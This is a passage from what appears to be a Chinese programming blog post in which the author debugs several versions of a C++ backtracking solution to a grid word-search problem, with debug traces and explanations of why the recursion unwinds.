<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  char a[n][n];</span><br><span class="line">   //vector&lt;string&gt; a(n);</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">         cin&gt;&gt;s;</span><br><span class="line">         int j=0;</span><br><span class="line">        for(int k=0;k&lt;s.size();k++)</span><br><span class="line">        &#123;</span><br><span class="line">          if(s[k]!=&#x27;,&#x27;)</span><br><span class="line">          &#123;</span><br><span class="line">            a[i][j]=s[k];</span><br><span class="line">            j++;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      //  a.push_back(tt);</span><br><span class="line">    &#125;</span><br><span class="line">但是作为函数调用的参数，报错的比较多，还是用vector吧</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">A,C,C,F</span><br><span class="line">C,D,E,D</span><br><span class="line">B,E,S,S</span><br><span class="line">F,E,C,A</span><br><span class="line">ACCESS</span><br><span class="line">move to 0,0</span><br><span class="line">now s[i] is A i: 0</span><br><span class="line">move to 1,0</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">move to 0,1</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">move to 0,2</span><br><span class="line">now s[i] is C i: 2</span><br><span class="line">move to 1,2</span><br><span class="line">now s[i] is E i: 3</span><br><span class="line">move to 2,2</span><br><span class="line">now s[i] is S i: 4</span><br><span class="line">move to 2,3</span><br><span class="line">now s[i] is S i: 5</span><br><span class="line">move to 3,3</span><br><span class="line">now s[i] is A i: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">是什么导致这个i，往回去了嘞，我把主函数的双for循环去掉了，没必要，直接从0开始即可</span><br></pre></td></tr></table></figure>

<h2 id="分析阶段"><a href="#分析阶段" class="headerlink" title="分析阶段"></a>分析阶段</h2><h3 id="代码片段1"><a href="#代码片段1" class="headerlink" title="代码片段1"></a>代码片段1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool check(vector&lt;vector&lt;char&gt; &gt;a,int row,int col,string s,int i,vector&lt;vector&lt;int&gt; &gt;visit,vector&lt;int&gt; &amp;res)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      if(a[row][col]!=s[i]) return false;</span><br><span class="line">    //  else  if(i==s.size()-1) return true;这样会导致最后一个不执行的哇</span><br><span class="line">   // else if(i==s.size()-1) return true;//把s的字符都找到了</span><br><span class="line">      if(i==s.size())</span><br><span class="line">      &#123;</span><br><span class="line">         cout&lt;&lt;&quot;end now&quot;&lt;&lt;endl;</span><br><span class="line">         return true;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;&quot;move to &quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;&quot;now s[i] is &quot;&lt;&lt;s[i]&lt;&lt;&quot; i: &quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">          res.push_back(row);</span><br><span class="line">          res.push_back(col);</span><br><span class="line">         cout&lt;&lt;&quot;insert &quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">         visit[row][col]=1;</span><br><span class="line">        // if(row-1&gt;=0&amp;&amp;a[row-1][col]==s[i+1]&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line"></span><br><span class="line">        if(row-1&gt;=0&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line">         &#123;</span><br><span class="line">            check(a,row-1,col,s,i+1,visit,res);</span><br><span class="line"></span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       if(row&lt;=a.size()-1&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">         &#123;</span><br><span class="line">            check(a,row+1,col,s,i+1,visit,res);</span><br><span class="line">   </span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">         &#123;</span><br><span class="line">            check(a,row,col-1,s,i+1,visit,res);</span><br><span class="line">    </span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        if(col&lt;=a.size()-1&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">         &#123;</span><br><span class="line">            check(a,row,col+1,s,i+1,visit,res);</span><br><span class="line">      </span><br><span class="line">          //  return true;</span><br><span class="line">         &#125;</span><br><span class="line">/*认为如果res长度够，那就不用回退，</span><br><span class="line">那塔喵取决于字符串长度了*/</span><br><span class="line">      // if(res.size()!=s.size()*2)</span><br><span class="line">     //  &#123;</span><br><span class="line">          res.pop_back();</span><br><span class="line">          res.pop_back();</span><br><span class="line">          cout&lt;&lt;&quot;delete&quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">      // &#125;</span><br><span class="line">         </span><br><span class="line">  </span><br><span class="line">         //递归完执行到这里说明走不完</span><br><span class="line">         visit[row][col]=0;</span><br><span class="line">       //  return result;</span><br><span class="line">       return false;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move to 0,0</span><br><span class="line">now s[i] is A i: 0</span><br><span class="line">move to 1,0</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">move to 0,1</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">move to 0,2</span><br><span class="line">now s[i] is C i: 2</span><br><span class="line">move to 1,2</span><br><span class="line">now s[i] is E i: 3</span><br><span class="line">move to 2,2</span><br><span class="line">now s[i] is S i: 4</span><br><span class="line">move to 2,3</span><br><span class="line">now s[i] is S i: 5</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">现在的问题是，全局变量res，加不进去坐标嘞</span><br><span class="line"></span><br><span class="line">详细点</span><br><span class="line">move to 0,0</span><br><span class="line">now s[i] is A i: 0</span><br><span class="line">insert 0,0</span><br><span class="line">move to 1,0</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">insert 1,0</span><br><span class="line">delete1,0</span><br><span class="line">move to 0,1</span><br><span class="line">now s[i] is C i: 1</span><br><span class="line">insert 0,1</span><br><span class="line">move to 0,2</span><br><span class="line">now s[i] is C i: 2</span><br><span class="line">insert 0,2</span><br><span class="line">move to 1,2</span><br><span class="line">now s[i] is E i: 3</span><br><span class="line">insert 1,2</span><br><span class="line">move to 2,2</span><br><span class="line">now s[i] is S i: 4</span><br><span class="line">insert 2,2</span><br><span class="line">move to 2,3</span><br><span class="line">now s[i] is S i: 5</span><br><span class="line">insert 2,3</span><br><span class="line">delete2,3</span><br><span class="line">delete2,2</span><br><span class="line">delete1,2</span><br><span class="line">delete0,2</span><br><span class="line">delete0,1</span><br><span class="line">delete0,0</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">它这相当于回退完了，按理说都执行i==s.size()，return true了，都终止条件了，为什么还回溯</span><br></pre></td></tr></table></figure>

<p>怎么说呢，当前实例的问题，更深层次的递归达到条件了，它要释放，那么次深层的也要释放，直到第一次递归释放为止，所以要对每一次递归进行判断，而不是只对结果判断，<strong>塔喵的！！</strong></p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool check(vector&lt;vector&lt;char&gt; &gt;a,int row,int col,string s,int i,vector&lt;vector&lt;int&gt; &gt;visit,vector&lt;int&gt; &amp;res)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      if(a[row][col]!=s[i]) return false;</span><br><span class="line">    //  else  if(i==s.size()-1) return true;这样会导致最后一个不执行的哇</span><br><span class="line">   // else if(i==s.size()-1) return true;//把s的字符都找到了</span><br><span class="line">      if(i==s.size())</span><br><span class="line">      &#123;</span><br><span class="line">         cout&lt;&lt;&quot;end now&quot;&lt;&lt;endl;</span><br><span class="line">         return true;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;&quot;move to &quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;&quot;now s[i] is &quot;&lt;&lt;s[i]&lt;&lt;&quot; i: &quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">          res.push_back(row);</span><br><span class="line">          res.push_back(col);</span><br><span class="line">         cout&lt;&lt;&quot;insert &quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">         visit[row][col]=1;</span><br><span class="line">        // if(row-1&gt;=0&amp;&amp;a[row-1][col]==s[i+1]&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line"></span><br><span class="line">        if(row-1&gt;=0&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line">         &#123;</span><br><span class="line">            if(check(a,row-1,col,s,i+1,visit,res))</span><br><span class="line">               return true;</span><br><span class="line"></span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       if(row&lt;=a.size()-1&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">         &#123;</span><br><span class="line">           if(check(a,row+1,col,s,i+1,visit,res))</span><br><span class="line">            return true;</span><br><span class="line">   </span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">         &#123;</span><br><span class="line">            if(check(a,row,col-1,s,i+1,visit,res))</span><br><span class="line">            return true;</span><br><span class="line">    </span><br><span class="line">           // return true;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        if(col&lt;=a.size()-1&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">         &#123;</span><br><span class="line">            if(check(a,row,col+1,s,i+1,visit,res))</span><br><span class="line">            return true;</span><br><span class="line">      </span><br><span class="line">          //  return true;</span><br><span class="line">         &#125;</span><br><span class="line">/*认为如果res长度够，那就不用回退，</span><br><span class="line">那塔喵取决于字符串长度了*/</span><br><span class="line">      // if(res.size()!=s.size()*2)</span><br><span class="line">     //  &#123;</span><br><span class="line">          res.pop_back();</span><br><span class="line">          res.pop_back();</span><br><span class="line">          cout&lt;&lt;&quot;delete&quot;&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">      // &#125;</span><br><span class="line">         </span><br><span class="line">  </span><br><span class="line">         //递归完执行到这里说明走不完</span><br><span class="line">         visit[row][col]=0;</span><br><span class="line">       //  return result;</span><br><span class="line">       return false;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="错误代码1"><a href="#错误代码1" class="headerlink" title="错误代码1"></a>错误代码1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;map&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">// vector&lt;int&gt; res1;</span><br><span class="line">bool check(vector&lt;vector&lt;char&gt;&gt; a, int row, int col, string s, int i, vector&lt;vector&lt;int&gt;&gt; visit, vector&lt;int&gt; &amp;res)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   if (a[row][col] != s[i])</span><br><span class="line">      return false;</span><br><span class="line">   //  else  if(i==s.size()-1) return true;这样会导致最后一个不执行的哇</span><br><span class="line">   // else if(i==s.size()-1) return true;//把s的字符都找到了</span><br><span class="line">   if (i == s.size())</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; &quot;end now&quot; &lt;&lt; endl;</span><br><span class="line">      return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; &quot;move to &quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; &quot;now s[i] is &quot; &lt;&lt; s[i] &lt;&lt; &quot; i: &quot; &lt;&lt; i &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">   res.push_back(row);</span><br><span class="line">   res.push_back(col);</span><br><span class="line">   cout &lt;&lt; &quot;insert &quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   visit[row][col] = 1;</span><br><span class="line">   // if(row-1&gt;=0&amp;&amp;a[row-1][col]==s[i+1]&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line"></span><br><span class="line">   if (row - 1 &gt;= 0 &amp;&amp; visit[row - 1][col] == 0) // 上</span><br><span class="line">   &#123;</span><br><span class="line">      if (check(a, row - 1, col, s, i + 1, visit, res))</span><br><span class="line">         return true;</span><br><span class="line"></span><br><span class="line">      // return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if (row &lt;= a.size() - 1 &amp;&amp; visit[row + 1][col] == 0) // 下</span><br><span class="line">   &#123;</span><br><span class="line">      if (check(a, row + 1, col, s, i + 1, visit, res))</span><br><span class="line">         return true;</span><br><span class="line"></span><br><span class="line">      // return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if (col - 1 &gt;= 0 &amp;&amp; visit[row][col - 1] == 0) // 左</span><br><span class="line">   &#123;</span><br><span class="line">      if (check(a, row, col - 1, s, i + 1, visit, res))</span><br><span class="line">         return true;</span><br><span class="line"></span><br><span class="line">      // return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if (col &lt;= a.size() - 1 &amp;&amp; visit[row][col + 1] == 0) // 右</span><br><span class="line">   &#123;</span><br><span class="line">      if (check(a, row, col + 1, s, i + 1, visit, res))</span><br><span class="line">         return true;</span><br><span class="line"></span><br><span class="line">      //  return true;</span><br><span class="line">   &#125;</span><br><span class="line">   /*认为如果res长度够，那就不用回退，</span><br><span class="line">   那塔喵取决于字符串长度了*/</span><br><span class="line">   // if(res.size()!=s.size()*2)</span><br><span class="line">   //  &#123;</span><br><span class="line">   res.pop_back();</span><br><span class="line">   res.pop_back();</span><br><span class="line">   cout &lt;&lt; &quot;delete&quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   // &#125;</span><br><span class="line"></span><br><span class="line">   // 递归完执行到这里说明走不完</span><br><span class="line">   visit[row][col] = 0;</span><br><span class="line">   //  return result;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int n;</span><br><span class="line">   cin &gt;&gt; n;</span><br><span class="line">   cin.ignore();</span><br><span class="line">   string s, t;</span><br><span class="line">   vector&lt;vector&lt;char&gt;&gt; a(n, vector&lt;char&gt;(n));</span><br><span class="line">   // vector&lt;string&gt; a(n);</span><br><span class="line">   for (int i = 0; i &lt; n; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      cin &gt;&gt; s;</span><br><span class="line">      int j = 0;</span><br><span class="line">      for (int k = 0; k &lt; s.size(); k++)</span><br><span class="line">      &#123;</span><br><span class="line">         if (s[k] != &#x27;,&#x27;)</span><br><span class="line">         &#123;</span><br><span class="line">            a[i][j] = s[k];</span><br><span class="line">            j++;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      //  a.push_back(tt);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   string tt;</span><br><span class="line">   cin &gt;&gt; tt;</span><br><span class="line"></span><br><span class="line">   //  search(a,tt,0,0,0);</span><br><span class="line">   // cout&lt;&lt;a[0][1];</span><br><span class="line">   int flag = 1;</span><br><span class="line">   vector&lt;vector&lt;int&gt;&gt; visit(n, vector&lt;int&gt;(n, 0));</span><br><span class="line"></span><br><span class="line">   int i = 0, j = 0;</span><br><span class="line">   vector&lt;int&gt; res; // 记录坐标</span><br><span class="line">   bool found = check(a, i, j, tt, 0, visit, res);</span><br><span class="line">   if (!found)</span><br><span class="line">      cout &lt;&lt; &quot;N&quot;;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">      for (int i = 0; i &lt; res.size(); i++)</span><br><span class="line">      &#123;</span><br><span class="line">         cout &lt;&lt; res[i];</span><br><span class="line">         if (i != res.size() - 1)</span><br><span class="line">            cout &lt;&lt; &quot;,&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="错误代码2"><a href="#错误代码2" class="headerlink" title="错误代码2"></a>错误代码2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;map&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">vector&lt;int&gt; res; // 记录坐标</span><br><span class="line">vector&lt;int&gt; path;</span><br><span class="line">bool check(vector&lt;vector&lt;char&gt;&gt; a, int row, int col, string s, int i, vector&lt;vector&lt;int&gt;&gt; &amp;visit)</span><br><span class="line">&#123;</span><br><span class="line">   if (a[row][col] != s[i])</span><br><span class="line">      return false;</span><br><span class="line">   //  else  if(i==s.size()-1) return true;这样会导致最后一个坐标不执行的哇</span><br><span class="line">   // else if(i==s.size()-1) return true;//把s的字符都找到了</span><br><span class="line">   else if (i == s.size()-1)//关于这个i==s.size()-1 和i==s.size() </span><br><span class="line">   &#123;</span><br><span class="line">      return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; &quot;move to &quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; &quot;now s[i] is &quot; &lt;&lt; s[i] &lt;&lt; &quot; i: &quot; &lt;&lt; i &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">   // res.push_back(row);</span><br><span class="line">   // res.push_back(col);</span><br><span class="line">   cout &lt;&lt; &quot;insert &quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   visit[row][col] = 1;</span><br><span class="line">   bool result=false;</span><br><span class="line">   // if(row-1&gt;=0&amp;&amp;a[row-1][col]==s[i+1]&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line"></span><br><span class="line">   if (row - 1 &gt;= 0&amp;&amp;visit[row-1][col]==0) // 上</span><br><span class="line">   &#123;</span><br><span class="line">      if(check(a, row - 1, col, s, i + 1, visit))</span><br><span class="line">         result=true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> if (row &lt; a.size()  &amp;&amp;visit[row+1][col]==0) // 下</span><br><span class="line">   &#123;</span><br><span class="line">      if(check(a, row + 1, col, s, i + 1, visit))</span><br><span class="line">        result=true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if (col - 1 &gt;= 0 &amp;&amp;visit[row][col-1]==0) // 左</span><br><span class="line">   &#123;</span><br><span class="line">      if(check(a, row, col - 1, s, i + 1, visit))</span><br><span class="line">        result=true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  if (col &lt; a.size() &amp;&amp;visit[row][col+1]==0) // 右</span><br><span class="line">   &#123;</span><br><span class="line">      if(check(a, row, col + 1, s, i + 1, visit))</span><br><span class="line">         result=true;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   cout &lt;&lt; &quot;delete&quot; &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">      // 递归完执行到这里说明走不完</span><br><span class="line">   visit[row][col] = 0;</span><br><span class="line"></span><br><span class="line">   // &#125;</span><br><span class="line">   cout&lt;&lt;&quot;do the successs&quot;&lt;&lt;endl;</span><br><span class="line"> </span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line">bool exist(vector&lt;vector&lt;char&gt;&gt; a,string s)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   int n=a.size();</span><br><span class="line">   vector&lt;vector&lt;int&gt;&gt; visit(n, vector&lt;int&gt;(n, 0));</span><br><span class="line">   for(int i=0;i&lt;n;i++)</span><br><span class="line">   for(int j=0;j&lt;n;j++)</span><br><span class="line">   &#123;</span><br><span class="line">      bool found = check(a, i, j, s, 0, visit);</span><br><span class="line">      if(found)</span><br><span class="line">      &#123;  </span><br><span class="line">         res.push_back(i);</span><br><span class="line">         res.push_back(j);</span><br><span class="line">         return found;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int n;</span><br><span class="line">   cin &gt;&gt; n;</span><br><span class="line">   cin.ignore();</span><br><span class="line">   string s, t;</span><br><span class="line">   vector&lt;vector&lt;char&gt;&gt; a(n, vector&lt;char&gt;(n));</span><br><span class="line">   // vector&lt;string&gt; a(n);</span><br><span class="line"></span><br><span class="line">   for (int i = 0; i &lt; n; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      cin &gt;&gt; s;</span><br><span class="line">      int j = 0;</span><br><span class="line">      for (int k = 0; k &lt; s.size(); k++)</span><br><span class="line">      &#123;</span><br><span class="line">         if (s[k] != &#x27;,&#x27;)</span><br><span class="line">         &#123;</span><br><span class="line">            a[i][j] = s[k];</span><br><span class="line">            j++;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      //  a.push_back(tt);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   string tt;</span><br><span class="line">   cin &gt;&gt; tt;</span><br><span class="line"></span><br><span class="line">   //  search(a,tt,0,0,0);</span><br><span class="line">   // cout&lt;&lt;a[0][1];</span><br><span class="line">   int flag = 1;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   //int i = 0, j = 0;</span><br><span class="line">   //bool found = check(a, i, j, tt, 0, visit);//2.只能保证开头0,0是入口的情况</span><br><span class="line">   //若在主程序中使用exsit函数的内容，它是不会适可而止的，即迷宫走完，它也会循环从入口继续走</span><br><span class="line">   //所以接收返回值</span><br><span class="line">   bool found=exist(a,tt);</span><br><span class="line">   for(int i=0;i&lt;res.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">      cout&lt;&lt;res[i];</span><br><span class="line">      if(i!=res.size()-1) cout&lt;&lt;&quot;,&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>非递归尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int n=a.size();</span><br><span class="line">  vector&lt;vector&lt;int&gt;&gt; visit(n,vector&lt;int&gt;(n,0));</span><br><span class="line">  int i=0;</span><br><span class="line">  while(i&lt;s.size())</span><br><span class="line">  &#123;</span><br><span class="line">     if(col&gt;=a.size()||row&gt;=a.size()||col&lt;0||row&lt;0)</span><br><span class="line">     &#123;</span><br><span class="line">        break;</span><br><span class="line">     &#125;</span><br><span class="line">     if(a[row][col]!=s[i])//找入口</span><br><span class="line">     &#123;</span><br><span class="line">        col++;</span><br><span class="line">        if(col==a.size())</span><br><span class="line">        &#123;</span><br><span class="line">           row++;</span><br><span class="line">           col=0;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     else if(a[row][col]==s[i])//找到了</span><br><span class="line">     &#123;</span><br><span class="line">        res.push_back(row);</span><br><span class="line">        res.push_back(col);</span><br><span class="line"></span><br><span class="line">       // i++;</span><br><span class="line">        visit[row][col]=1;</span><br><span class="line"></span><br><span class="line">        if(row-1&gt;=0&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line">        &#123;</span><br><span class="line">           row=row-1;</span><br><span class="line">           i++;</span><br><span class="line">        &#125;</span><br><span class="line">       else if(row+1&lt;=a.size()&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">        &#123;</span><br><span class="line">            row=row+1;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">     else if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">        &#123;</span><br><span class="line">           col=col-1;</span><br><span class="line">           i++;</span><br><span class="line">        &#125;</span><br><span class="line">     else if(col+1&lt;=a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">        &#123;</span><br><span class="line">           col=col+1;</span><br><span class="line">           i++;</span><br><span class="line">        &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">        res.pop_back();</span><br><span class="line">        res.pop_back();</span><br><span class="line">        i--;</span><br><span class="line">        visit[row][col]=0;</span><br><span class="line">     &#125;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>遇到的问题有：</p>
<p>1.还原的问题</p>
<p>2.然后是一条道走到底的问题</p>
<p>所以为什么递归很香。。。。</p>
<h3 id="关键之处"><a href="#关键之处" class="headerlink" title="关键之处"></a>关键之处</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">A,C,C,F</span><br><span class="line">C,D,E,D</span><br><span class="line">B,E,S,S</span><br><span class="line">F,E,C,A</span><br><span class="line">ACCESS</span><br><span class="line">input row 0,col 0</span><br><span class="line">input row 1,col 0</span><br><span class="line">no match~~~~</span><br><span class="line">2,0 B, s[i]2 C</span><br><span class="line">no match~~~~</span><br><span class="line">1,1 D, s[i]2 C</span><br><span class="line">delete row 1,col 0</span><br><span class="line">input row 0,col 1</span><br><span class="line">no match~~~~</span><br><span class="line">1,1 D, s[i]2 C</span><br><span class="line">input row 0,col 2</span><br><span class="line">input row 1,col 2</span><br><span class="line">input row 2,col 2</span><br><span class="line">no match~~~~</span><br><span class="line">3,2 C, s[i]5 S</span><br><span class="line">no match~~~~</span><br><span class="line">2,1 E, s[i]5 S</span><br><span class="line">input row 2,col 3</span><br><span class="line">end now!!!!</span><br><span class="line">end now!!!! /////好，主要看下这后面是什么情况，他喵的都return true啦</span><br><span class="line">delete row 2,col 3</span><br><span class="line">delete row 2,col 2</span><br><span class="line">no match~~~~</span><br><span class="line">1,1 D, s[i]4 S</span><br><span class="line">no match~~~~</span><br><span class="line">1,3 D, s[i]4 S</span><br><span class="line">delete row 1,col 2</span><br><span class="line">no match~~~~</span><br><span class="line">0,3 F, s[i]3 E</span><br><span class="line">delete row 0,col 2</span><br><span class="line">delete row 0,col 1</span><br><span class="line">delete row 0,col 0</span><br><span class="line">1,0,2,3,2,2,1,2,0,2,0,1,0,0</span><br></pre></td></tr></table></figure>

<p>既然这样，我就在return true的时候，将那个res(终会pop完的)，复制给一个新的vector，path;对吧，在res它pop完之前，完整交给另一个数组即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool check(vector&lt;vector&lt;char&gt;&gt; a, int row, int col, string s, int i,  vector&lt;vector&lt;int&gt;&gt;&amp; visit)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      int n=a.size();</span><br><span class="line">      if(col&gt;=a.size()||row&gt;=a.size()||col&lt;0||row&lt;0)</span><br><span class="line">      &#123;</span><br><span class="line">         return false;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(i==s.size()) </span><br><span class="line">      &#123;</span><br><span class="line">         cout&lt;&lt;&quot;end now!!!!&quot;&lt;&lt;endl;</span><br><span class="line">         path=res; ////我不管，点睛之笔</span><br><span class="line">         return true;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      bool result=false;</span><br><span class="line"></span><br><span class="line">      if(a[row][col]!=s[i])//判断找到了没</span><br><span class="line">      &#123;</span><br><span class="line">         cout&lt;&lt;&quot;no match~~~~&quot;&lt;&lt;endl;</span><br><span class="line">         cout&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;&quot; &quot;&lt;&lt;a[row][col]&lt;&lt;&quot;, s[i]&quot;&lt;&lt;i&lt;&lt;&quot; &quot;&lt;&lt;s[i]&lt;&lt;endl;</span><br><span class="line">      //  res.clear(); //我在这里清空</span><br><span class="line">         return false;</span><br><span class="line">      &#125;</span><br><span class="line">         res.push_back(row);</span><br><span class="line">         res.push_back(col);</span><br><span class="line">      // else if(a[row][col]==s[i])//找到了</span><br><span class="line">      // &#123;</span><br><span class="line">         //  res.push_back(row);</span><br><span class="line">         //  res.push_back(col);</span><br><span class="line">         cout&lt;&lt;&quot;input row &quot;&lt;&lt;row&lt;&lt;&quot;,col &quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">        // i++;</span><br><span class="line">         visit[row][col]=1;</span><br><span class="line"></span><br><span class="line">         if(row-1&gt;=0&amp;&amp;visit[row-1][col]==0)//上</span><br><span class="line">         &#123;</span><br><span class="line">           // check(a,row-1,col,s,i+1,visit);</span><br><span class="line"></span><br><span class="line">           if(check(a,row-1,col,s,i+1,visit))</span><br><span class="line">             result=true;</span><br><span class="line">         &#125;</span><br><span class="line">       // else if(row+1&lt;=a.size()&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">       if(row+1&lt;=a.size()&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">         &#123;</span><br><span class="line">            //  row=row+1;</span><br><span class="line">            //  i++;</span><br><span class="line">           //  check(a,row+1,col,s,i+1,visit);</span><br><span class="line">           